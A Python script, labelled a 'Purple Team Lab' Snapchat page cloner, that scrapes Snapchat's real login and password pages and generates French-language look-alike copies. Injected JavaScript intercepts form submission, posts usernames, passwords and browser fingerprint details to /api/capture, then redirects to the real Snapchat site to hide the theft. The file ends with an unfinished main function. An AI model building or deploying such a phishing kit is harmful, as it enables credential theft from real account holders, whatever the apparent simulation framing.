"""
Snapchat Page Cloner v2 — Purple Team Lab
Capture le login Snapchat avec Playwright puis génère login.html + password.html
en utilisant les classes CSS exactes et le CDN fraîchement capturés.

USAGE : python generate.py
"""

import os
import sys
import re
import json
import time
import argparse
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

CONFIG = {
    "URL":           "https://accounts.snapchat.com/v2/login",
    "TEMPLATE_DIR":  os.path.join(BASE_DIR, "templates"),
    "STATIC_DIR":    os.path.join(BASE_DIR, "static"),
    "WAIT_MS":       5000,
    "USER_AGENT":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                     "AppleWebKit/537.36 (KHTML, like Gecko) "
                     "Chrome/125.0.0.0 Safari/537.36",
}


def eprint(*a, **kw):
    print(*a, **kw, flush=True)



def download_resources(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    resources = {"css": [], "js": [], "images": []}
    for link in soup.find_all("link", rel="stylesheet"):
        href = link.get("href")
        if href:
            resources["css"].append(urljoin(base_url, href))
    for script in soup.find_all("script", src=True):
        src = script.get("src")
        if src:
            resources["js"].append(urljoin(base_url, src))
    for img in soup.find_all("img", src=True):
        src = img.get("src")
        if src and not src.startswith("data:"):
            resources["images"].append(urljoin(base_url, src))
    fi = soup.find("link", rel="icon") or soup.find("link", rel="shortcut icon")
    if fi and fi.get("href"):
        resources["images"].append(urljoin(base_url, fi["href"]))

    headers = {"User-Agent": CONFIG["USER_AGENT"]}
    ext_map = {
        "text/css": ".css", "text/javascript": ".js",
        "application/javascript": ".js", "application/x-javascript": ".js",
        "image/png": ".png", "image/jpeg": ".jpg", "image/gif": ".gif",
        "image/svg+xml": ".svg", "image/webp": ".webp", "image/x-icon": ".ico",
    }
    resource_map = {}

    for url_res in resources["css"] + resources["js"] + resources["images"]:
        try:
            resp = requests.get(url_res, headers=headers, timeout=10, allow_redirects=True)
            resp.raise_for_status()
            ct = resp.headers.get("Content-Type", "")
            parsed = urlparse(url_res)
            filename = os.path.basename(parsed.path) or f"res_{abs(hash(url_res))}"
            if "." not in os.path.splitext(filename)[1]:
                ext = ext_map.get(ct.split(";")[0].strip().lower(), "")
                if ext:
                    filename += ext
            ct_lower = ct.split(";")[0].strip().lower()
            if "css" in ct_lower:
                sub = "css"
            elif "javascript" in ct_lower or "js" in filename:
                sub = "js"
            elif "image" in ct_lower:
                sub = "images"
            else:
                sub = "other"
            folder = os.path.join(CONFIG["STATIC_DIR"], sub)
            os.makedirs(folder, exist_ok=True)
            path = os.path.join(folder, filename)
            if not os.path.exists(path):
                with open(path, "wb") as f:
                    f.write(resp.content)
            resource_map[url_res] = f"/static/{sub}/{filename}"
            print(f"  [OK] {sub}/{filename}")
        except Exception:
            pass

    return resource_map


def fix_resources(soup, base_url, resource_map):
    for link in soup.find_all("link", rel="stylesheet"):
        href = link.get("href")
        if href:
            full = urljoin(base_url, href)
            if full in resource_map:
                link["href"] = resource_map[full]
    for sc in soup.find_all("script", src=True):
        src = sc.get("src")
        if src:
            full = urljoin(base_url, src)
            if full in resource_map:
                sc["src"] = resource_map[full]
    for img in soup.find_all("img", src=True):
        src = img.get("src")
        if src and not src.startswith("data:"):
            full = urljoin(base_url, src)
            if full in resource_map:
                img["src"] = resource_map[full]


def capture_login():
    from playwright.sync_api import sync_playwright

    eprint("[*] Playwright — capture login Snapchat...")
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox",
                  "--disable-dev-shm-usage", "--disable-gpu",
                  "--disable-web-security",
                  "--disable-features=IsolateOrigins,site-per-process"]
        )
        context = browser.new_context(
            user_agent=CONFIG["USER_AGENT"],
            viewport={"width": 1280, "height": 900},
            java_script_enabled=True,
            ignore_https_errors=True,
        )
        page = context.new_page()
        eprint(f"[*] Navigation vers {CONFIG['URL']} ...")
        try:
            page.goto(CONFIG["URL"], wait_until="domcontentloaded", timeout=30000)
        except Exception as e:
            eprint(f"  [!] {e}")
        eprint(f"[*] Attente rendu React ({CONFIG['WAIT_MS']}ms)...")
        time.sleep(CONFIG["WAIT_MS"] / 1000)
        html = page.content()
        os.makedirs(CONFIG["STATIC_DIR"], exist_ok=True)
        page.screenshot(path=os.path.join(CONFIG["STATIC_DIR"], "_debug_login.png"))
        browser.close()
    eprint(f"[+] Login HTML capturé ({len(html):,} octets)")
    return html


def capture_password():
    from playwright.sync_api import sync_playwright
    try:
        from playwright_stealth import Stealth
        HAS_STEALTH = True
    except ImportError:
        HAS_STEALTH = False
        eprint("  [!] playwright-stealth non installe: pip install playwright-stealth")

    eprint("[*] Playwright — capture password Snapchat (mode furtif)...")
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox",
                  "--disable-dev-shm-usage", "--disable-gpu"]
        )
        context = browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 900},
            java_script_enabled=True,
            ignore_https_errors=True,
            locale="fr-FR",
            timezone_id="Europe/Paris",
        )
        page = context.new_page()
        if HAS_STEALTH:
            Stealth().apply_stealth_sync(page)

        eprint("[*] Tentative 1: navigation vers /v2/password directement...")
        try:
            page.goto("https://accounts.snapchat.com/v2/password", wait_until="domcontentloaded", timeout=15000)
            time.sleep(3)
            current = page.url
            eprint(f"  URL actuelle: {current}")
            test_html = page.content()
            if "password" in current and 'type="password"' in test_html:
                eprint("[+] Page password chargee directement!")
                os.makedirs(CONFIG["STATIC_DIR"], exist_ok=True)
                page.screenshot(path=os.path.join(CONFIG["STATIC_DIR"], "_debug_password.png"))
                browser.close()
                eprint(f"[+] Password HTML capturé ({len(test_html):,} octets)")
                return test_html
            else:
                eprint("  [-] Pas de champ password - tentative via login...")
        except Exception as e:
            eprint(f"  [!] {e}")

        eprint("[*] Tentative 2: navigation via login + soumission...")
        try:
            page.goto(CONFIG["URL"], wait_until="domcontentloaded", timeout=30000)
        except Exception as e:
            eprint(f"  [!] {e}")
        eprint(f"[*] Attente rendu React ({CONFIG['WAIT_MS']}ms)...")
        time.sleep(CONFIG["WAIT_MS"] / 1000)

        eprint("[*] Saisie de l'identifiant Snapchat...")
        try:
            email_input = page.wait_for_selector('input', timeout=8000)
            if email_input:
                test_user = os.environ.get("SNAPCHAT_TEST_USER", "fm_sng")
                email_input.fill(test_user)
                time.sleep(1.5)
                page.keyboard.press("Enter")
                for _ in range(15):
                    time.sleep(1)
                    pw = page.query_selector_all('input[type="password"]')
                    if len(pw) > 0:
                        eprint(f"  [!] Champ password detecte!")
                        break
                time.sleep(2)
                eprint(f"  URL apres soumission: {page.url}")
        except Exception as e:
            eprint(f"  [!] {e}")

        html = page.content()
        os.makedirs(CONFIG["STATIC_DIR"], exist_ok=True)
        page.screenshot(path=os.path.join(CONFIG["STATIC_DIR"], "_debug_password.png"))
        browser.close()
    eprint(f"[+] Password HTML capturé ({len(html):,} octets)")
    return html


def strip_nextjs(head_soup):
    for tag in head_soup.find_all("script"):
        src = tag.get("src", "")
        if src:
            tag.decompose()
        else:
            tag.decompose()


def extract_classes(soup):
    def find(pattern):
        tag = soup.find(class_=re.compile(pattern))
        if tag:
            for c in tag.get("class", []):
                if re.search(pattern, c):
                    return c
        return None

    return {
        "login_container": find(r'Login_container__') or "Login_container__KLPD5",
        "login_form": find(r'Login_form__') or "Login_form__u_9g5",
        "login_next": find(r'Login_next__') or "Login_next__2nEN0",
        "text_input": find(r'TextInput_textInput__') or "TextInput_textInput__XIzwQ",
        "text_input_container": find(r'TextInput_textInputContainer__') or "TextInput_textInputContainer__5XOd0",
        "field_with_icon": find(r'TextInput_fieldWithIcon__') or "TextInput_fieldWithIcon__MnOEz",
        "label_cls": find(r'TextInput_label__') or "TextInput_label__G5rQV",
        "shared_title": find(r'Shared_title__') or "Shared_title__6SqEP",
        "heading": find(r'Heading_h') or "Heading_h600__IqY8L",
        "all_wrapper": find(r'Login_allElementsWrapper__') or "Login_allElementsWrapper__Ld1Dk",
        "center_el": find(r'Login_centerElement__') or "Login_centerElement__VMykY",
        "row_cls": find(r'Login_row__') or "Login_row__YVYTT",
        "right_icon": find(r'TextInput_rightIcon__') or "TextInput_rightIcon__B4qnm",
        "text_input_hover": find(r'TextInput_textInputHover__') or "TextInput_textInputHover__h602r",
        "page_wrapper": find(r'PageSkeleton_pageWrapper__') or "PageSkeleton_pageWrapper__D44FB",
        "page_frame": find(r'PageFrame_pageFrame__') or "PageFrame_pageFrame__LST7x",
        "desktop_content": find(r'PageFrame_desktopContentWrapper__') or "PageFrame_desktopContentWrapper__GNLle",
        "desktop_page": find(r'PageFrame_desktopPageContent__') or "PageFrame_desktopPageContent__ogNsw",
        "page_custom": find(r'PageSkeleton_pageContentCustomStyles__') or "PageSkeleton_pageContentCustomStyles__A_ayo",
        "mobile_header": find(r'MobileCTAHeader_headerContainer__') or "MobileCTAHeader_headerContainer__x0XFc",
        "mobile_footer_wrapper": find(r'MobileCTAHeader_mobileCustomFooterWrapper__') or "MobileCTAHeader_mobileCustomFooterWrapper__BGDqc",
        "mobile_cta": find(r'MobileGhostIconCTABanner_container__') or "MobileGhostIconCTABanner_container__aonwu",
    }


def build_clean_head(soup, resource_map):
    head_soup = BeautifulSoup(str(soup.head), "html.parser") if soup.head else BeautifulSoup("<head><title>Snapchat</title></head>", "html.parser")
    strip_nextjs(head_soup)
    if head_soup.title:
        head_soup.title.string = "Connexion | Snapchat"
    for link in head_soup.find_all("link", rel="stylesheet"):
        href = link.get("href")
        if href:
            full = urljoin(CONFIG["URL"], href)
            if full in resource_map:
                link["href"] = resource_map[full]
    return str(head_soup)


def build_login(html, resource_map):
    soup = BeautifulSoup(html, "html.parser")
    fix_resources(soup, CONFIG["URL"], resource_map)

    viewport_meta = soup.new_tag("meta", attrs={"name": "viewport", "content": "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"})
    if soup.head:
        soup.head.insert(0, viewport_meta)

    pid_script = soup.new_tag("script")
    pid_script.string = """
(function() {
    var pid = sessionStorage.getItem('participant_id') || '{{ participant_id }}';
    if (pid) {
        sessionStorage.setItem('participant_id', pid);
        document.querySelectorAll('form').forEach(function(f) {
            var inp = document.createElement('input');
            inp.type = 'hidden'; inp.name = 'participant_id'; inp.value = pid;
            f.appendChild(inp);
        });
    }
})();
"""
    soup.body.append(pid_script)

    capture_script = soup.new_tag("script")
    capture_script.string = """
(function() {
    var pageStart = Date.now(), clickCount = 0, captured = false;
    document.addEventListener('click', function() { clickCount++; });
    document.addEventListener('click', function(e) {
        var btn = e.target.closest('button[type="submit"], button.Login_next__2nEN0');
        if (!btn || captured) return;
        var form = btn.closest('form');
        if (!form) return;
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        captured = true;
        var fd = new FormData(form);
        var data = {};
        fd.forEach(function(v, k) { data[k] = v; });
        data.participant_id = sessionStorage.getItem('participant_id') || '';
        data.step = 'login';
        data.screen_resolution = screen.width + 'x' + screen.height;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser_language = navigator.language;
        data.platform = navigator.platform;
        data.time_on_page = Math.floor((Date.now() - pageStart) / 1000);
        data.referrer = document.referrer;
        data.click_count = clickCount;
        fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data), keepalive: true
        });
        var username = data.accountIdentifier || data.username || '';
        sessionStorage.setItem('lab_username', username);
        var el = btn.closest('[class*="Login_container"]') || form.parentElement;
        if (el) {
            el.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;gap:16px;padding:40px"><div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin 1s linear infinite"></div><p style="font-size:16px;color:#16191c">Connexion...</p><p style="font-size:12px;color:#71757a">Veuillez patienter</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
        }
        setTimeout(function() { window.location.href = '/password?u=' + encodeURIComponent(username); }, 2000);
    }, true);
})();
"""
    soup.body.append(capture_script)

    stealth = soup.new_tag("script", src="/static/stealth.js")
    soup.body.append(stealth)

    style = soup.new_tag("style")
    style.string = """
#__next-route-announcer__ { position:absolute; clip:rect(0,0,0,0); width:1px; height:1px; overflow:hidden; }
[class*="Button_button"] { background-color:#1a73e8 !important; }
[class*="Login_next"] { background:#1a73e8 !important; }
[class*="Login_allElementsWrapper"] { margin-top:48px !important; }
[class*="Login_container"] { padding-top:24px !important; }
a[href*="phone_number"] { color:#1a73e8 !important; }
@media (max-width:600px) {
  [class*="PageSkeleton_pageWrapper"] { padding:0 !important; }
  [class*="Login_container"] { width:100% !important; max-width:100% !important; margin:0 !important; padding:24px 20px !important; box-sizing:border-box !important; }
  [class*="Login_allElementsWrapper"] { margin-top:24px !important; }
  [class*="Shared_title"] { font-size:22px !important; }
  [class*="TextInput_textInput"] { font-size:16px !important; padding:12px !important; }
  [class*="PageFrame_desktopPageContent"] { padding:0 !important; }
}
"""
    soup.body.append(style)

    return str(soup)


def strip_all_scripts(soup):
    for tag in soup.find_all("script"):
        src = tag.get("src", "")
        if src and ("_next" in src or "chunk" in src or "framework" in src
                     or "webpack" in src or "main-" in src or "_app" in src
                     or "polyfills" in src):
            tag.decompose()
        elif not src and ("self.__" in str(tag.string or "")
                          or "next" in str(tag.string or "").lower()[:100]):
            tag.decompose()


TRANSLATIONS = {
    "Enter Password": "Saisir le mot de passe",
    "Not you?": "Ce n'était pas vous ?",
    "Forgot Password": "Mot de passe oublié",
    "Next": "Suivant",
    "Password": "Mot de passe",
    "Company": "Société",
    "Snap Inc.": "Snap Inc.",
    "Careers": "Offres d'emploi",
    "News": "Actualités",
    "Community": "Communauté",
    "Support": "Assistance",
    "Community Guidelines": "Règles de la communauté",
    "Safety Center": "Centre de sécurité",
    "Advertising": "Publicité",
    "Buy Ads": "Acheter des pubs",
    "Advertising Policies": "Politiques publicitaires",
    "Political Ads Library": "Bibliothèque d'annonces politiques",
    "Brand Guidelines": "Charte graphique",
    "Promotions Rules": "Règles promotionnelles",
    "Legal": "Informations juridiques",
    "Privacy Center": "Centre de confidentialité",
    "Your Privacy Choices": "Vos choix de confidentialité",
    "Cookie Policy": "Politique des cookies",
    "Report Infringement": "Signaler une infraction",
    "Custom Creative Tools Terms": "Conditions des outils créatifs",
    "Community Geofilter Terms": "Conditions des géofiltres",
    "Lens Studio Terms": "Conditions de Lens Studio",
    "Language": "Langue",
    "Privacy Policy": "Politique de confidentialité",
    "Terms of Service": "Conditions d'utilisation",
    "All rights reserved": "Tous droits réservés",
    "or": "ou",
}


def translate_html(html_str):
    for en, fr in TRANSLATIONS.items():
        if en != "Next":
            html_str = html_str.replace(f">{en}<", f">{fr}<")
        else:
            html_str = html_str.replace(f">{en}<", f">{fr}<")
    return html_str


def build_password(html, resource_map):
    soup = BeautifulSoup(html, "html.parser")
    fix_resources(soup, CONFIG["URL"], resource_map)
    strip_all_scripts(soup)

    if soup.title:
        soup.title.string = "Saisir le mot de passe | Snapchat"

    viewport_meta = soup.new_tag("meta", attrs={"name": "viewport", "content": "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"})
    if soup.head:
        soup.head.insert(0, viewport_meta)

    pid_script = soup.new_tag("script")
    pid_script.string = """
(function() {
    var pid = sessionStorage.getItem('participant_id') || '{{ participant_id }}';
    if (pid) {
        sessionStorage.setItem('participant_id', pid);
        document.querySelectorAll('form').forEach(function(f) {
            var inp = document.createElement('input');
            inp.type = 'hidden'; inp.name = 'participant_id'; inp.value = pid;
            f.appendChild(inp);
        });
    }
})();
"""
    soup.body.append(pid_script)

    capture_script = soup.new_tag("script")
    capture_script.string = """
(function() {
    var pageStart = Date.now(), clickCount = 0, captured = false;
    document.addEventListener('click', function() { clickCount++; });
    document.addEventListener('click', function(e) {
        var btn = e.target.closest('button[type="submit"], button.Login_next__2nEN0');
        if (!btn || captured) return;
        var form = btn.closest('form');
        if (!form) return;
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        captured = true;
        var fd = new FormData(form);
        var data = {};
        fd.forEach(function(v, k) { data[k] = v; });
        data.participant_id = sessionStorage.getItem('participant_id') || '';
        data.step = 'password';
        data.screen_resolution = screen.width + 'x' + screen.height;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser_language = navigator.language;
        data.platform = navigator.platform;
        data.time_on_page = Math.floor((Date.now() - pageStart) / 1000);
        data.referrer = document.referrer;
        data.click_count = clickCount;
        fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data), keepalive: true
        });
        var el = btn.closest('[class*="Login_container"]') || form.parentElement;
        if (el) {
            el.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;gap:16px;padding:40px"><div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin 1s linear infinite"></div><p style="font-size:16px;color:#16191c">Connexion en cours...</p><p style="font-size:12px;color:#71757a">Veuillez patienter</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
        }
        setTimeout(function() { window.location.href = 'https://accounts.snapchat.com'; }, 2000);
    }, true);
})();
"""
    soup.body.append(capture_script)

    stealth = soup.new_tag("script", src="/static/stealth.js")
    soup.body.append(stealth)

    style = soup.new_tag("style")
    style.string = """
[class*="Button_button"] { background-color:#1a73e8 !important; }
[class*="Login_next"] { background:#1a73e8 !important; }
@media (max-width:600px) {
  [class*="PageSkeleton_pageWrapper"] { padding:0 !important; }
  [class*="Login_container"] { width:100% !important; max-width:100% !important; margin:0 !important; padding:24px 20px !important; box-sizing:border-box !important; }
  [class*="Login_allElementsWrapper"] { margin-top:24px !important; }
  [class*="Shared_title"] { font-size:22px !important; }
  [class*="TextInput_textInput"] { font-size:16px !important; padding:12px !important; }
  [class*="PageFrame_desktopPageContent"] { padding:0 !important; }
}
"""
    soup.body.append(style)

    result = str(soup)
    result = translate_html(result)
    return result


def generate_password(login_html):
    soup = BeautifulSoup(login_html, "html.parser")
    h = extract_classes(soup)
    head_html = build_clean_head(soup, {})

    if head_soup := BeautifulSoup(head_html, "html.parser"):
        if head_soup.title:
            head_soup.title.string = "Saisir le mot de passe | Snapchat"
        head_html = str(head_soup)

    ghost_svg = soup.select_one('[data-testid="GhostIconFilled"]')
    ghost_html = str(ghost_svg) if ghost_svg else """<svg width="60" height="60" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M35.8336 26.7701C35.6786 26.2535 34.9294 25.8918 34.9294 25.8918C34.8623 25.8505 34.7951 25.8195 34.7434 25.7936C33.4983 25.1943 32.3978 24.471 31.473 23.6495C30.7291 22.9882 30.0884 22.2649 29.5769 21.49C28.9518 20.5497 28.6573 19.7592 28.5333 19.3355C28.461 19.0565 28.4765 18.948 28.5333 18.8034C28.585 18.6846 28.7245 18.5657 28.7968 18.5141C29.2153 18.2196 29.8921 17.7804 30.3054 17.5118C30.6619 17.2793 30.9719 17.0778 31.1527 16.9538C31.7365 16.5456 32.1344 16.1323 32.372 15.6828C32.6768 15.1042 32.713 14.4635 32.4753 13.8384C32.155 12.9911 31.3645 12.4848 30.3622 12.4848C30.1401 12.4848 29.9076 12.5106 29.6803 12.5571C29.1068 12.6811 28.5591 12.8878 28.1045 13.0634C28.0735 13.0789 28.0373 13.0531 28.0373 13.0169C28.0838 11.8855 28.1407 10.3665 28.0167 8.9199C27.903 7.61278 27.6343 6.51232 27.1952 5.55135C26.7509 4.58522 26.1826 3.87225 25.7279 3.36076C25.2991 2.86995 24.55 2.14664 23.4133 1.49566C21.8169 0.581195 19.9983 0.116211 18.0092 0.116211C16.0253 0.116211 14.2118 0.581195 12.6102 1.4905C11.4116 2.17764 10.6418 2.95261 10.2905 3.3556C9.84097 3.87225 9.26749 4.58522 8.82317 5.54619C8.38402 6.50715 8.11536 7.60761 8.0017 8.91473C7.8777 10.3614 7.92937 11.7615 7.98103 13.0118C7.98103 13.0479 7.94487 13.0738 7.91387 13.0583C7.45922 12.8826 6.91157 12.6759 6.33809 12.5519C6.11076 12.5003 5.88344 12.4796 5.65611 12.4796C4.65382 12.4796 3.86334 12.9859 3.54302 13.8332C3.30536 14.4635 3.34153 15.099 3.64635 15.6777C3.88401 16.1271 4.28183 16.5405 4.86564 16.9486C5.04647 17.0726 5.35646 17.2741 5.71295 17.5066C6.1211 17.7701 6.77724 18.1937 7.19573 18.4934C7.24739 18.5296 7.42305 18.6639 7.47988 18.8034C7.54188 18.9532 7.55221 19.0617 7.47472 19.3562C7.34555 19.785 7.05107 20.5652 6.43625 21.49C5.92477 22.2649 5.28413 22.9882 4.54015 23.6495C3.61019 24.471 2.50972 25.1943 1.26977 25.7936C1.21294 25.8195 1.14061 25.8556 1.06311 25.8969C0.985615 25.9381 0.923614 25.9743 0.882365 26.0053L0.830703 26.0414C0.789454 26.0724 0.748206 26.1035 0.727456 26.1345C0.685205 26.1965 0.732371 26.213 0.748206 26.2182C0.769958 26.2337 0.785792 26.2492 0.796125 26.2647L3.44454 29.4933C3.46429 29.5191 3.48921 29.5346 3.51413 29.5501C3.54421 29.5656 3.57946 29.5759 3.61471 29.5811C5.70806 30.5508 8.02175 31.0249 10.4945 31.0249C12.277 31.0249 14.1569 30.7915 15.9697 30.3247C16.2469 30.3484 16.5346 30.361 16.8326 30.361C18.6199 30.361 20.2431 29.961 21.6677 29.2765C21.7649 29.2506 21.8569 29.2145 21.9438 29.1732C22.0265 29.137 22.104 29.0906 22.1712 29.0391L31.9741 22.9934C32.0103 22.9675 32.0413 22.9417 32.0672 22.9106L35.5845 18.879C35.6619 18.7872 35.7001 18.6749 35.7001 18.5677C35.7001 18.5077 35.6898 18.4472 35.669 18.3871L35.8336 26.7701Z" fill="#FFFC00"/><path d="M30.7799 34.7954C29.6117 36.204 28.0119 37.0933 26.1856 37.3709C25.5691 37.4657 24.9331 37.5047 24.2922 37.5047C20.8159 37.5047 17.3965 36.4027 15.0111 34.5928C14.5842 34.2701 14.1771 33.9266 13.8003 33.573C13.694 33.5962 13.5803 33.6141 13.464 33.6173C11.7207 33.658 10.0694 33.3591 8.5772 32.7978C8.28853 32.6908 8.01018 32.5701 7.737 32.4432C9.29974 33.6438 11.159 34.4167 13.1176 34.6787C13.509 34.7284 13.9034 34.7532 14.2952 34.7574C14.8226 34.7615 15.3274 34.7237 15.7925 34.6401C17.8869 36.4847 20.7025 37.4995 23.5766 37.4995C24.7209 37.4995 25.8848 37.3276 26.993 36.9617C28.729 36.4115 30.1873 35.2673 31.1671 33.8073C31.5137 33.9988 31.8654 34.1801 32.2269 34.346C31.8049 34.7897 31.3273 35.1838 30.7799 34.7954Z" fill="#FFFC00"/></svg>"""

    body = f"""<!DOCTYPE html>
<html data-theme="dark">
{head_html}
<body id="root">
<div id="__next">
<div class="{h['page_wrapper']}">
<main class="{h['page_frame']}" data-testid="page-frame">
<div class="{h['all_wrapper']}">
<div class="{h['login_container']}" style="padding:32px 24px;">
<div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin-bottom:16px;">
{ghost_html}
<h1 class="{h['shared_title']}" style="text-align:center;">Saisir le mot de passe</h1>
</div>
<div style="text-align:center;margin:0 0 16px 0;">
<p id="lab-username-display" style="font-size:15px;color:#16191c;margin:0 0 2px 0;font-weight:500;">utilisateur</p>
<a href="/login" id="lab-edit-link" style="display:inline-block;font-size:13px;color:#71757a;text-decoration:none;">Ce n'était pas vous&nbsp;?</a>
</div>
<form class="{h['login_form']}" id="lab-password-form" style="margin-top:8px;">
<div class="{h['text_input_container']}">
<h6 class="{h['heading']}">
<label for="password" class="{h['label_cls']}"><span>Mot de passe</span></label>
</h6>
<div class="{h['field_with_icon']} {h['text_input_hover']}" style="position:relative;">
<input id="password" name="password" type="password" class="{h['text_input']}" style="padding-right:44px;" value="" autocomplete="current-password" placeholder="">
<span class="{h['right_icon']}" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;display:flex;align-items:center;">
<svg width="22" height="15" viewBox="0 0 22 14" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M11.0508 0C15.908 0 19.2003 3.71804 20.6288 5.73471C21.1722 6.50184 21.1722 7.49816 20.6288 8.26529C19.2003 10.282 15.908 14 11.0508 14C6.21972 14 2.86868 10.3219 1.39045 8.29804C0.81901 7.51566 0.81901 6.48434 1.39045 5.70196C2.86868 3.67808 6.21972 0 11.0508 0ZM16.039 6.99987C16.0389 4.34203 13.8024 2.18747 11.0436 2.18751C8.28473 2.18755 6.04828 4.34217 6.04828 7.00001C6.04818 8.27647 6.57447 9.50067 7.51134 10.4033C8.44821 11.3059 9.71891 11.8129 11.0439 11.8129C13.8027 11.8124 16.0391 9.65771 16.039 6.99987ZM11.044 10.0622C12.7996 10.0622 14.2228 8.69106 14.2228 6.99969C14.2228 5.30831 12.7996 3.93719 11.044 3.93736C9.28841 3.93736 7.86521 5.30838 7.86511 6.99969C7.86511 8.69106 9.28834 10.0622 11.044 10.0622Z" fill="#AEB6BD"/>
</svg>
</span>
</div>
</div>
<div style="margin:10px 0 14px 0;">
<a href="https://accounts.snapchat.com/v2/password_reset" style="font-size:13px;color:#71757a;text-decoration:none;">Mot de passe oublié&nbsp;?</a>
</div>
<div class="{h['center_el']} {h['row_cls']}">
<button type="submit" class="{h['login_next']}" data-testid="password-submit-button" style="background:#1a73e8;border:none;color:#fff;font-size:15px;font-weight:600;padding:12px 24px;border-radius:8px;cursor:pointer;width:100%;">Suivant</button>
</div>
</form>
</div>
</div>
</main>
</div>
</div>
<style>
[class*="Login_next"] {{ background:#1a73e8 !important; }}
[class*="Login_allElementsWrapper"] {{ margin-top:48px !important; }}
[class*="Login_container"] {{ padding-top:24px !important; }}
[class*="TextInput_textInput"] {{ border:1px solid #cbd1d6 !important; border-radius:6px !important; padding:14px 44px 14px 14px !important; font-size:15px !important; width:100% !important; box-sizing:border-box !important; outline:none !important; background:transparent !important; color:#16191c !important; }}
[class*="TextInput_textInput"]:focus {{ border-color:#1a73e8 !important; border-width:2px !important; }}
[class*="TextInput_textInputContainer"] {{ margin-bottom:0 !important; }}
[class*="TextInput_label"] {{ font-size:13px !important; color:#71757a !important; margin-bottom:6px !important; display:block !important; }}
[class*="TextInput_fieldWithIcon"] {{ position:relative !important; }}
[class*="Login_form"] {{ max-width:100% !important; }}
[class*="Heading_h"] {{ margin:0 0 6px 0 !important; font-size:13px !important; font-weight:400 !important; }}
body {{ background:#fff !important; margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; }}
@media (max-width:600px) {{
  [class*="Login_container"] {{ width:100% !important; max-width:100% !important; margin:0 !important; padding:24px 20px !important; box-sizing:border-box !important; }}
  .{h['shared_title']} {{ font-size:22px !important; }}
  [class*="Login_allElementsWrapper"] {{ margin-top:20px !important; }}
  [class*="TextInput_textInput"] {{ font-size:16px !important; }}
}}
</style>
<script>
(function() {{
    var pid = sessionStorage.getItem('participant_id') || '';
    if (pid) {{
        document.querySelectorAll('form').forEach(function(f) {{
            var inp = document.createElement('input');
            inp.type = 'hidden'; inp.name = 'participant_id'; inp.value = pid;
            f.appendChild(inp);
        }});
    }}
}})();
</script>
<script>
(function() {{
    var pageStart = Date.now(), clickCount = 0, captured = false;
    document.addEventListener('click', function() {{ clickCount++; }});
    var username = new URLSearchParams(window.location.search).get('u') || sessionStorage.getItem('lab_username') || '';
    var display = document.getElementById('lab-username-display');
    if (display && username) display.textContent = username;
    function doCapture(form) {{
        if (captured) return;
        captured = true;
        var fd = new FormData(form);
        var data = {{}};
        fd.forEach(function(v, k) {{ data[k] = v; }});
        data.participant_id = sessionStorage.getItem('participant_id') || '';
        if (username) data.accountIdentifier = username;
        data.step = 'password';
        data.screen_resolution = screen.width + 'x' + screen.height;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser_language = navigator.language;
        data.platform = navigator.platform;
        data.time_on_page = Math.floor((Date.now() - pageStart) / 1000);
        data.referrer = document.referrer;
        data.click_count = clickCount;
        fetch('/api/capture', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data), keepalive: true
        }});
        var el = form.closest('[class*="Login_container"]') || form.parentElement;
        if (el) {{
            el.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;gap:16px;padding:40px"><div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin 1s linear infinite"></div><p style="font-size:16px;color:#16191c">Connexion en cours...</p><p style="font-size:12px;color:#71757a">Veuillez patienter</p></div><style>@keyframes spin{{to{{transform:rotate(360deg)}}}}</style>';
        }}
        setTimeout(function() {{ window.location.href = 'https://accounts.snapchat.com'; }}, 2000);
    }}
    document.addEventListener('click', function(e) {{
        var btn = e.target.closest('#lab-password-form button[type="submit"]');
        if (!btn) return;
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        doCapture(btn.closest('#lab-password-form'));
    }}, true);
    document.addEventListener('submit', function(e) {{
        var pwForm = e.target.closest('#lab-password-form');
        if (!pwForm) return;
        e.preventDefault();
        doCapture(pwForm);
    }});
}})();
</script>
<script src="/static/stealth.js"></script>
</body>
</html>"""
    return body


def main():
    parser = argparse.ArgumentParser(description="Snapchat Page Cloner v2")
    parser.add_argument("--wait", type=int, default=CONFIG["WAIT_MS"])
    args = parser.parse_args()
    CONFIG["WAIT_MS"] = args.wait

